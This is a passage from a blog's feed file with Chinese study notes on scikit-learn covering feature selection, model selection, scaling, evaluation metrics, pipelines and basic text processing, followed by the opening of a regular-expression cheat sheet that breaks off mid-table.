href="#自动化特征选择" class="headerlink" title="自动化特征选择"></a>自动化特征选择</h2><p>添加更多特征会使所有模型变得更加复杂，从而增大过拟合的可能性。在添加新特征或处理一般的高维数据集时，最好将特征的数量减少到只包含最有用的那些特征，并删除其余特征。这样会得到泛化能力更好、更简单的模型。</p><h3 id="单变量统计"><a href="#单变量统计" class="headerlink" title="单变量统计"></a>单变量统计</h3><p>如果一个特征只有在与另一个特征合并时才具有信息量，那么这个特征将被舍弃。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> sklearn.feature_selection <span class="keyword">import</span> SelectPercentile</span><br><span class="line">select = SelectPercentile(percentile=<span class="number">50</span>) <span class="comment"># 选择重要性前50%的特征</span></span><br><span class="line">select.fit(X_train, y_train)</span><br><span class="line">X_train_selected = select.transform(X_train)</span><br><span class="line">mask = select.get_support()</span><br><span class="line"><span class="built_in">print</span>(mask) <span class="comment"># 将遮罩可视化，黑色代表保留该特征</span></span><br></pre></td></tr></table></figure><h3 id="基于模型的特征选择"><a href="#基于模型的特征选择" class="headerlink" title="基于模型的特征选择"></a>基于模型的特征选择</h3><p>基于模型的特征选择使用一个监督机器学习模型来判断每个特征的重要性，并且仅保留最重要的特征。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> sklearn.feature_selection <span class="keyword">import</span> SelectFromModel</span><br><span class="line"><span class="keyword">from</span> sklearn.ensemble <span class="keyword">import</span> RandomForestClassifier</span><br><span class="line">select = SelectFromModel(RandomForestClassifier(</span><br><span class="line">    n_estimators=<span class="number">100</span>, random_state=<span class="number">42</span>), threshold=<span class="string">&quot;median&quot;</span>)</span><br><span class="line">select.fit(X_train, y_train)</span><br><span class="line">X_train_l1 = select.transform(X_train)</span><br><span class="line">mask = select.get_support()</span><br><span class="line"><span class="built_in">print</span>(mask) <span class="comment"># 将遮罩可视化，黑色代表保留该特征</span></span><br></pre></td></tr></table></figure><h3 id="迭代特征选择"><a href="#迭代特征选择" class="headerlink" title="迭代特征选择"></a>迭代特征选择</h3><p>在迭代特征选择中，将会构建一系列模型，每个模型都使用不同数量的特征。其中一种特殊方法是递归特征消除（recursive feature elimination，RFE），它从所有特征开始构建模型，并根据模型舍弃最不重要的特征，然后使用除被舍弃特征之外的所有特征来构建一个新模型，如此继续，直到仅剩下预设数量的特征。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> sklearn.feature_selection <span class="keyword">import</span> RFE</span><br><span class="line">select = RFE(RandomForestClassifier(</span><br><span class="line">    n_estimators=<span class="number">100</span>, random_state=<span class="number">42</span>), n_features_to_select=<span class="number">40</span>)</span><br><span class="line">select.fit(X_train, y_train)</span><br><span class="line">mask = select.get_support()</span><br><span class="line"><span class="built_in">print</span>(mask) <span class="comment"># 将遮罩可视化，黑色代表保留该特征</span></span><br></pre></td></tr></table></figure><h1 id="模型选择"><a href="#模型选择" class="headerlink" title="模型选择"></a>模型选择</h1><h2 id="K最近邻"><a href="#K最近邻" class="headerlink" title="K最近邻"></a>K最近邻</h2><p>适用于<strong>小型数据集</strong>，是很好的基准模型，很容易解释。</p><p>两个重要参数：邻居个数与数据点之间距离的度量方法</p><h2 id="线性模型（包括线性支持向量机）"><a href="#线性模型（包括线性支持向量机）" class="headerlink" title="线性模型（包括线性支持向量机）"></a>线性模型（包括线性支持向量机）</h2><p>非常可靠的首选算法，<strong>适用于非常大的数据集，也适用于高维数据</strong>。</p><p>一个重要参数：正则化参数，在回归模型中叫alpha，在分类模型中叫做C。alpha越小或C越大则模型相对越复杂。</p><h2 id="朴素贝叶斯"><a href="#朴素贝叶斯" class="headerlink" title="朴素贝叶斯"></a>朴素贝叶斯</h2><p>只适用于分类问题。比线性模型速度还快，但泛化能力相对较差，<strong>适用于非常大的数据集和高维数据。精度通常要低于线性模型</strong>。</p><p>一个重要参数：alpha。alpha越小则模型越复杂。</p><h2 id="决策树"><a href="#决策树" class="headerlink" title="决策树"></a>决策树</h2><p>速度很快，<strong>不需要数据缩放</strong>，<strong>不能外推（预测未见过的数据）</strong>，可以可视化，很容易解释。</p><p>一个重要参数：选择一种预剪枝策略（设置 max_depth、max_leaf_nodes 或 min_samples_leaf）防止过拟合。</p><p>预剪枝：通过限制树的最大深度或者叶结点的最大数目等来限制树的复杂度，从而提高泛化精度。</p><p>树的可视化</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> sklearn.tree <span class="keyword">import</span> export_graphviz</span><br><span class="line">export_graphviz(tree, out_file=<span class="string">&quot;tree.dot&quot;</span>, class_names=[<span class="string">&quot;malignant&quot;</span>,<span class="string">&quot;benign&quot;</span>], </span><br><span class="line">                feature_names=cancer.feature_names, impurity=<span class="literal">False</span>, filled=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure><p>查看树的特征重要性（也可进行可视化查看）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Feature importances:\n&#123;&#125;&quot;</span>.<span class="built_in">format</span>(tree.feature_importances_))</span><br></pre></td></tr></table></figure><h2 id="随机森林"><a href="#随机森林" class="headerlink" title="随机森林"></a>随机森林</h2><p>几乎总是比单棵决策树的表现要好，鲁棒性很好，非常强大。<strong>不需要数据缩放，不适用于高维稀疏数据</strong>。</p><p>两个关键参数：n_estimators，即树的数量。max_features，即每棵树所随机采样的特征类型的最大数量，一般采用默认值。较小则每棵树的差异会很大，会产生深度较大的树；较大则每棵树都较为相似。以及可选的预剪枝参数。</p><h2 id="梯度提升决策树"><a href="#梯度提升决策树" class="headerlink" title="梯度提升决策树"></a>梯度提升决策树</h2><p>由深度很小的树组成，<strong>调参优秀的情况下精度通常比随机森林略高</strong>。与随机森林相比，训练速度更慢，但预测速度更快，需要的内存也更少，比随机森林需要更多的参数调节，且对参数敏感。</p><p>两个关键参数：n_estimators，即树的数量。learning_rate，即学习率，较高的学习率意味着每棵树可以对上一棵树的结果做出较强的修正，模型会更加复杂。以及可选的预剪枝参数。</p><h2 id="核支持向量机"><a href="#核支持向量机" class="headerlink" title="核支持向量机"></a>核支持向量机</h2><p><strong>对于特征含义相似的中等大小的数据集很强大</strong>。<strong>需要数据缩放</strong>，对参数敏感。</p><p>两个关键参数：C和gamma，分别代表每个点的重要性和高斯核半径。两参数越大模型越复杂，且两参数强烈相关相关，应该同时调节。</p><p><img src="1.png"></p><p>SVM常用的数据预处理为将所有特征缩放到0和1之间，即使用MinMaxScaler()。</p><h2 id="神经网络"><a href="#神经网络" class="headerlink" title="神经网络"></a>神经网络</h2><p>可以构建非常复杂的模型，特别是对于大型数据集而言。<strong>对数据缩放敏感</strong>，对参数选取敏感。<strong>大型网络需要很长的训练时间</strong>。</p><p>两个重要参数：层数和每层的隐单元个数（使用列表指定），以及正则化参数alpha</p><p>估计神经网络的复杂度：依靠计算权重个数估计，权重数 = 特征数 * 第一层单元个数 + 第一层单元个数 * 第二层单元个数 ……</p><p>神经网络常将数据预处理为均值为 0、方差为1，即使用StandardScaler()</p><h1 id="数据预处理"><a href="#数据预处理" class="headerlink" title="数据预处理"></a>数据预处理</h1><h2 id="对于不平衡数据集的处理"><a href="#对于不平衡数据集的处理" class="headerlink" title="对于不平衡数据集的处理"></a>对于不平衡数据集的处理</h2><p>尽量选择正例与反例样本数量基本相等</p><p>统计方法：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Samples per class: &#123;&#125;&quot;</span>.<span class="built_in">format</span>(np.bincount(y)))</span><br></pre></td></tr></table></figure><h2 id="StandardScaler"><a href="#StandardScaler" class="headerlink" title="StandardScaler"></a>StandardScaler</h2><p>确保每个特征的平均值为 0、方差为 1，使所有特征都位于同一量级。但这种缩放不能保证特征任何特定的最大值和最小值。</p><h2 id="RobustScaler"><a href="#RobustScaler" class="headerlink" title="RobustScaler"></a>RobustScaler</h2><p>工作原理与StandardScaler 类似，确保每个特征的统计属性都位于同一范围。但RobustScaler 使用的是中位数和四分位数 1，而不是平均值和方差。这样 RobustScaler 会忽略与其他点有很大不同的数据点（比如测量误差）。</p><h2 id="MinMaxScaler"><a href="#MinMaxScaler" class="headerlink" title="MinMaxScaler"></a>MinMaxScaler</h2><p>移动数据，使所有特征都刚好位于 0 到 1 之间。</p><h2 id="Normalizer"><a href="#Normalizer" class="headerlink" title="Normalizer"></a>Normalizer</h2><p>它对每个数据点进行缩放，使得特征向量的欧式长度等于 1。换句话说，它将一个数据点投射到半径为 1 的圆上（对于更高维度的情况，是球面）。</p><h2 id="主成分分析（PCA）"><a href="#主成分分析（PCA）" class="headerlink" title="主成分分析（PCA）"></a>主成分分析（PCA）</h2><p>主成分分析（principal component analysis，PCA）是一种旋转数据集的方法，旋转后的特征在统计上不相关。</p><p>一个主要参数：n_components，即最后保留的特征类别数量</p><h2 id="非负矩阵分解（NMF）"><a href="#非负矩阵分解（NMF）" class="headerlink" title="非负矩阵分解（NMF）"></a>非负矩阵分解（NMF）</h2><p>非负矩阵分解（non-negative matrix factorization，NMF）是另一种无监督学习算法，其目的在于提取有用的特征。它的工作原理类似于 PCA，也可以用于降维。</p><h1 id="模型评估"><a href="#模型评估" class="headerlink" title="模型评估"></a>模型评估</h1><h2 id="欠拟合"><a href="#欠拟合" class="headerlink" title="欠拟合"></a>欠拟合</h2><p>通常表现为训练集精度与测试集精度接近</p><h2 id="过拟合"><a href="#过拟合" class="headerlink" title="过拟合"></a>过拟合</h2><p>通常表现为训练集精度过分高于测试集精度</p><h2 id="交叉验证"><a href="#交叉验证" class="headerlink" title="交叉验证"></a>交叉验证</h2><p>交叉验证（cross-validation）是一种评估泛化性能的统计学方法，它比单次划分训练集和测试集的方法更加稳定、全面。</p><p>一个重要参数：cv，即折数，或交叉验证分离器</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> sklearn.model_selection <span class="keyword">import</span> cross_val_score</span><br><span class="line">scores = cross_val_score(logreg, iris.data, iris.target)</span><br></pre></td></tr></table></figure><p>由于数据集中的分类可能出现比较集中的情况，可以采用分层交叉验证、打乱划分交叉验证、分组交叉验证等方法，即通过构造交叉验证分类器来解决。</p><h2 id="带交叉验证的参数网格搜索"><a href="#带交叉验证的参数网格搜索" class="headerlink" title="带交叉验证的参数网格搜索"></a>带交叉验证的参数网格搜索</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">param_grid = &#123;<span class="string">&#x27;C&#x27;</span>: [<span class="number">0.001</span>, <span class="number">0.01</span>, <span class="number">0.1</span>, <span class="number">1</span>, <span class="number">10</span>, <span class="number">100</span>],</span><br><span class="line"> <span class="string">&#x27;gamma&#x27;</span>: [<span class="number">0.001</span>, <span class="number">0.01</span>, <span class="number">0.1</span>, <span class="number">1</span>, <span class="number">10</span>, <span class="number">100</span>]&#125;</span><br><span class="line"><span class="keyword">from</span> sklearn.model_selection <span class="keyword">import</span> GridSearchCV</span><br><span class="line">grid_search = GridSearchCV(SVC(), param_grid, cv=<span class="number">5</span>)</span><br><span class="line">grid_search.fit(X_train, y_train)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Best parameters: &#123;&#125;&quot;</span>.<span class="built_in">format</span>(grid_search.best_params_))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Best cross-validation score: &#123;:.2f&#125;&quot;</span>.<span class="built_in">format</span>(grid_search.best_score_))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Best estimator:\n&#123;&#125;&quot;</span>.<span class="built_in">format</span>(grid_search.best_estimator_))</span><br></pre></td></tr></table></figure><h2 id="混淆矩阵"><a href="#混淆矩阵" class="headerlink" title="混淆矩阵"></a>混淆矩阵</h2><p>对于二分类问题的评估结果，一种最全面的表示方法是使用混淆矩阵，混淆矩阵主对角线 上的元素对应于正确的分类，而其他元素则告诉我们一个类别中有多少样本被错误地划分到其他类别中。onfusion_matrix 的输出是一个 2×2 数组，其中行对应于真实的类别，列对应于预测的类别。</p><h2 id="计算准确率与召回率的classification-report"><a href="#计算准确率与召回率的classification-report" class="headerlink" title="计算准确率与召回率的classification_report"></a>计算准确率与召回率的classification_report</h2><p>我们可以使用 classification_report 函数来评估两个类别的准确率与召回率,准确率即预测成功率，召回率即预测正例占真正正例的比例，f1-score是准确率与召回率的平均。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">print</span>(classification_report(y_test, svc.predict(X_test)))</span><br></pre></td></tr></table></figure><p>可以利用如下代码计算准确率-召回率曲线</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> sklearn.metrics <span class="keyword">import</span> precision_recall_curve</span><br><span class="line">precision, recall, thresholds = precision_recall_curve(y_test, svc.decision_function(X_test))</span><br><span class="line">close_zero = np.argmin(np.<span class="built_in">abs</span>(thresholds))</span><br><span class="line">plt.plot(precision[close_zero], recall[close_zero], <span class="string">&#x27;o&#x27;</span>, </span><br><span class="line">         markersize=<span class="number">10</span>, label=<span class="string">&quot;threshold zero&quot;</span>, fillstyle=<span class="string">&quot;none&quot;</span>, c=<span class="string">&#x27;k&#x27;</span>, mew=<span class="number">2</span>)</span><br><span class="line">plt.plot(precision, recall, label=<span class="string">&quot;precision recall curve&quot;</span>)</span><br><span class="line">plt.xlabel(<span class="string">&quot;Precision&quot;</span>)</span><br><span class="line">plt.ylabel(<span class="string">&quot;Recall&quot;</span>)</span><br></pre></td></tr></table></figure><h2 id="ROC曲线：反映假正例率和真正例率"><a href="#ROC曲线：反映假正例率和真正例率" class="headerlink" title="ROC曲线：反映假正例率和真正例率"></a>ROC曲线：反映假正例率和真正例率</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> sklearn.metrics <span class="keyword">import</span> roc_curve</span><br><span class="line">fpr, tpr, thresholds = roc_curve(y_test, svc.decision_function(X_test))</span><br><span class="line">plt.plot(fpr, tpr, label=<span class="string">&quot;ROC Curve&quot;</span>)</span><br><span class="line">plt.xlabel(<span class="string">&quot;FPR&quot;</span>)</span><br><span class="line">plt.ylabel(<span class="string">&quot;TPR (recall)&quot;</span>)</span><br><span class="line"><span class="comment"># 找到最接近于0的阈值</span></span><br><span class="line">close_zero = np.argmin(np.<span class="built_in">abs</span>(thresholds))</span><br><span class="line">plt.plot(fpr[close_zero], tpr[close_zero], <span class="string">&#x27;o&#x27;</span>, markersize=<span class="number">10</span>, </span><br><span class="line">         label=<span class="string">&quot;threshold zero&quot;</span>, fillstyle=<span class="string">&quot;none&quot;</span>, c=<span class="string">&#x27;k&#x27;</span>, mew=<span class="number">2</span>)</span><br><span class="line">plt.legend(loc=<span class="number">4</span>)</span><br></pre></td></tr></table></figure><h2 id="选择参考指标的scoring"><a href="#选择参考指标的scoring" class="headerlink" title="选择参考指标的scoring"></a>选择参考指标的scoring</h2><p>对于分类问题，scoring 参数最重要的取值包括：accuracy（默认值）、roc_auc（ROC 曲线下方的面积）、average_precision（准确率 - 召回率曲线下方的面积）、f1、f1_macro、f1_micro 和 f1_weighted（这四个是二分类的 f1- 分数以及各种加权变体）。对于回归问题，最常用的取值包括：r2（R2 分数）、mean_squared_error（均方误差）和 mean_absolute_error（平均绝对误差）。</p><h1 id="管道"><a href="#管道" class="headerlink" title="管道"></a>管道</h1><h2 id="构建管道"><a href="#构建管道" class="headerlink" title="构建管道"></a>构建管道</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> sklearn.pipeline <span class="keyword">import</span> make_pipeline</span><br><span class="line"><span class="comment"># 标准语法</span></span><br><span class="line">pipe_long = Pipeline([(<span class="string">&quot;scaler&quot;</span>, MinMaxScaler()), (<span class="string">&quot;svm&quot;</span>, SVC(C=<span class="number">100</span>))])</span><br><span class="line"><span class="comment"># 缩写语法</span></span><br><span class="line">pipe_short = make_pipeline(MinMaxScaler(), SVC(C=<span class="number">100</span>))</span><br></pre></td></tr></table></figure><h2 id="在网格搜索中使用管道"><a href="#在网格搜索中使用管道" class="headerlink" title="在网格搜索中使用管道"></a>在网格搜索中使用管道</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">param_grid = &#123;<span class="string">&#x27;svm__C&#x27;</span>: [<span class="number">0.001</span>, <span class="number">0.01</span>, <span class="number">0.1</span>, <span class="number">1</span>, <span class="number">10</span>, <span class="number">100</span>],</span><br><span class="line"> <span class="string">&#x27;svm__gamma&#x27;</span>: [<span class="number">0.001</span>, <span class="number">0.01</span>, <span class="number">0.1</span>, <span class="number">1</span>, <span class="number">10</span>, <span class="number">100</span>]&#125;</span><br><span class="line">grid = GridSearchCV(pipe, param_grid=param_grid, cv=<span class="number">5</span>)</span><br><span class="line">grid.fit(X_train, y_train)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Best cross-validation accuracy: &#123;:.2f&#125;&quot;</span>.<span class="built_in">format</span>(grid.best_score_))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Test set score: &#123;:.2f&#125;&quot;</span>.<span class="built_in">format</span>(grid.score(X_test, y_test)))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Best parameters: &#123;&#125;&quot;</span>.<span class="built_in">format</span>(grid.best_params_))</span><br></pre></td></tr></table></figure><h2 id="访问步骤属性"><a href="#访问步骤属性" class="headerlink" title="访问步骤属性"></a>访问步骤属性</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">components = pipe.named_steps[<span class="string">&quot;pca&quot;</span>].components_</span><br></pre></td></tr></table></figure><h1 id="基础自然语言处理知识"><a href="#基础自然语言处理知识" class="headerlink" title="基础自然语言处理知识"></a>基础自然语言处理知识</h1><h2 id="数据清洗"><a href="#数据清洗" class="headerlink" title="数据清洗"></a>数据清洗</h2><p>例子：去除文本中的<code>&lt;br /&gt;</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">text_train = [doc.replace(<span class="string">b&quot;&lt;br /&gt;&quot;</span>, <span class="string">b&quot; &quot;</span>) <span class="keyword">for</span> doc <span class="keyword">in</span> text_train]</span><br></pre></td></tr></table></figure><h2 id="计算词袋模型并转化数据"><a href="#计算词袋模型并转化数据" class="headerlink" title="计算词袋模型并转化数据"></a>计算词袋模型并转化数据</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> sklearn.feature_extraction.text <span class="keyword">import</span> CountVectorizer</span><br><span class="line"><span class="comment"># CountVectorizer默认使用的正则表达式是&#x27;\b\w\w+\b&#x27;</span></span><br><span class="line">vect = CountVectorizer(min_df=<span class="number">5</span>) <span class="comment"># 仅提取至少在五个文档中出现的词</span></span><br><span class="line">vect.fit(article_list)</span><br><span class="line">bag_of_words = vect.transform(article_list)</span><br><span class="line">feature_names = vect.get_feature_names()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;First 20 features:\n&#123;&#125;&quot;</span>.<span class="built_in">format</span>(feature_names[:<span class="number">20</span>]))</span><br></pre></td></tr></table></figure><h2 id="n-gram"><a href="#n-gram" class="headerlink" title="n-gram"></a>n-gram</h2><p>除一元分词外，其余可保存上下文信息，而不仅仅是单词信息。ngram_range 参数是一个元组，包含要考虑的词例序列的最小长度和最大长度。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cv = CountVectorizer(ngram_range=(<span class="number">1</span>, <span class="number">1</span>)).fit(bards_words) <span class="comment"># 一元分词</span></span><br><span class="line">cv = CountVectorizer(ngram_range=(<span class="number">2</span>, <span class="number">2</span>)).fit(bards_words) <span class="comment"># 二元分词</span></span><br><span class="line">cv = CountVectorizer(ngram_range=(<span class="number">1</span>, <span class="number">3</span>)).fit(bards_words) <span class="comment"># 同时获得一元、二元、三元</span></span><br></pre></td></tr></table></figure><h2 id="停用词"><a href="#停用词" class="headerlink" title="停用词"></a>停用词</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> sklearn.feature_extraction.text <span class="keyword">import</span> ENGLISH_STOP_WORDS</span><br><span class="line">vect = CountVectorizer(min_df=<span class="number">5</span>, stop_words=<span class="string">&quot;english&quot;</span>).fit(text_train)</span><br></pre></td></tr></table></figure><h2 id="用词频-逆向文档频率缩放数据（tf-idf）"><a href="#用词频-逆向文档频率缩放数据（tf-idf）" class="headerlink" title="用词频 - 逆向文档频率缩放数据（tf-idf）"></a>用词频 - 逆向文档频率缩放数据（tf-idf）</h2><p>这一方法对在某个特定文档中经常出现的术语给予很高的权重，但对在语料库的许多文档中都经常出现的术语给予的权重却不高。</p><p>scikit-learn 在两个类中实现了 tf-idf 方法：TfidfTransformer 和TfidfVectorizer，<strong>前者接受 CountVectorizer 生成的稀疏矩阵并将其变换，后者接受文本数据并完成词袋特征提取与 tf-idf 变换。</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> sklearn.feature_extraction.text <span class="keyword">import</span> TfidfVectorizer</span><br><span class="line"><span class="keyword">from</span> sklearn.pipeline <span class="keyword">import</span> make_pipeline</span><br><span class="line">pipe = make_pipeline(TfidfVectorizer(min_df=<span class="number">5</span>),</span><br><span class="line"> LogisticRegression())</span><br><span class="line">param_grid = &#123;<span class="string">&#x27;logisticregression__C&#x27;</span>: [<span class="number">0.001</span>, <span class="number">0.01</span>, <span class="number">0.1</span>, <span class="number">1</span>, <span class="number">10</span>]&#125;</span><br><span class="line">grid = GridSearchCV(pipe, param_grid, cv=<span class="number">5</span>)</span><br><span class="line">grid.fit(text_train, y_train)</span><br><span class="line">vectorizer = grid.best_estimator_.named_steps[<span class="string">&quot;tfidfvectorizer&quot;</span>]</span><br><span class="line"><span class="comment"># 变换训练数据集</span></span><br><span class="line">X_train = vectorizer.transform(text_train)</span><br><span class="line"><span class="comment"># 找到数据集中每个特征的最大值</span></span><br><span class="line">max_value = X_train.<span class="built_in">max</span>(axis=<span class="number">0</span>).toarray().ravel()</span><br><span class="line">sorted_by_tfidf = max_value.argsort()</span><br><span class="line"><span class="comment"># 获取特征名称</span></span><br><span class="line">feature_names = np.array(vectorizer.get_feature_names())</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Features with lowest tfidf:\n&#123;&#125;&quot;</span>.<span class="built_in">format</span>(</span><br><span class="line">    feature_names[sorted_by_tfidf[:<span class="number">20</span>]]))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Features with highest tfidf: \n&#123;&#125;&quot;</span>.<span class="built_in">format</span>(</span><br><span class="line"> feature_names[sorted_by_tfidf[-<span class="number">20</span>:]]))</span><br></pre></td></tr></table></figure><h2 id="高级分词、词干提取与词形还原"><a href="#高级分词、词干提取与词形还原" class="headerlink" title="高级分词、词干提取与词形还原"></a>高级分词、词干提取与词形还原</h2><p>主要是解决英文中同一个单词拥有不同词性、时态等情况时，将所有这些都归为同一个单词，这样可以减少过拟合的风险。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> spacy</span><br><span class="line"><span class="keyword">import</span> nltk</span><br><span class="line"><span class="comment"># 加载spacy的英语模型</span></span><br><span class="line">en_nlp = spacy.load(<span class="string">&#x27;en&#x27;</span>)</span><br><span class="line"><span class="comment"># 将nltk的Porter词干提取器实例化</span></span><br><span class="line">stemmer = nltk.stem.PorterStemmer()</span><br></pre></td></tr></table></figure><h1 id="其余关于无监督学习和自然语言处理的知识另行总结"><a href="#其余关于无监督学习和自然语言处理的知识另行总结" class="headerlink" title="其余关于无监督学习和自然语言处理的知识另行总结"></a>其余关于无监督学习和自然语言处理的知识另行总结</h1>]]></content>
      
      
      <categories>
          
          <category> 机器学习相关 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 机器学习 </tag>
            
            <tag> 基本流程 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>正则表达式速查</title>
      <link href="/2021/09/26/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F%E9%80%9F%E6%9F%A5/"/>
      <url>/2021/09/26/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F%E9%80%9F%E6%9F%A5/</url>
      
        <content type="html"><![CDATA[<h1 id="正则表达式语法速查表"><a href="#正则表达式语法速查表" class="headerlink" title="正则表达式语法速查表"></a>正则表达式语法速查表</h1><table><thead><tr><th align="center">字符</th><th align="center">描述</th></tr></thead><tbody><tr><td align="center">\</td><td align="center">将下一个字符标记为一个特殊字符、或一个原义字符、或一个向后引用、或一个八进制转义符。例如，“<code>n</code>“匹配字符”<code>n</code>“。”<code>\n</code>“匹配一个换行符。串行”<code>\\</code>“匹配”<code>\</code>“而”<code>\(</code>“则匹配”<code>(</code>“。</td></tr><tr><td align="center">^</td><td align="center">匹配输入字符串的开始位置。如果设置了RegExp对象的Multiline属性，^也匹配“<code>\n</code>“或”<code>\r</code>“之后的位置。</td></tr><tr><td align="center">$</td><td align="center">匹配输入字符串的结束位置。如果设置了RegExp对象的Multiline属性，$也匹配“<code>\n</code>“或”<code>\r</code>“之前的位置。</td></tr><tr><td align="center">*</td><td align="center">匹配前面的子表达式零次或多次。例如，zo<em>能匹配“<code>z</code>“以及”<code>zoo</code>“。</em>等价于{0,}。</td></tr><tr><td align="center">+</td><td align="center">匹配前面的子表达式一次或多次。例如，“<code>zo+</code>“能匹配”<code>zo</code>“以及”<code>zoo</code>“，但不能匹配”<code>z</code>“。+等价于{1,}。</td></tr><tr><td align="center">?</td><td align="center">匹配前面的子表达式零次或一次。例如，“<code>do(es)?</code>“可以匹配”<code>does</code>“或”<code>does</code>“中的”<code>do</code>“。?等价于{0,1}。</td></tr><tr><td align="center">{<em>n</em>}</td><td align="center"><em>n</em>是一个非负整数。匹配确定的<em>n</em>次。例如，“<code>o&#123;2&#125;</code>“不能匹配”<code>Bob</code>“中的”<code>o</code>“，但是能匹配”<code>food</code>“中的两个o。</td></tr><tr><td align="center">{<em>n</em>,}</td><td align="center"><em>n</em>是一个非负整数。至少匹配<em>n</em>次。例如，“<code>o&#123;2,&#125;</code>“不能匹配”<code>Bob</code>“中的”<code>o</code>“，但能匹配”<code>foooood</code>“中的所有o。”<code>o&#123;1,&#125;</code>“等价于”<code>o+</code>“。”<code>o&#123;0,&#125;</code>“则等价于”<code>o*</code>“。</td></tr><tr><td align="center">{<em>n</em>,<em>m</em>}</td><td align="center"><em>m</em>和<em>n</em>均为非负整数，其中<em>n</em>&lt;=<em>m</em>。最少匹配<em>n</em>次且最多匹配<em>m</em>次。例如，“<code>o&#123;1,3&#125;</code>“将匹配”<code>fooooood</code>“中的前三个o。”<code>o&#123;0,1&#125;</code>“等价于”<code>o?</code>“。请注意在逗号和两个数之间不能有空格。</td></tr><tr><td align="center">?</td><td 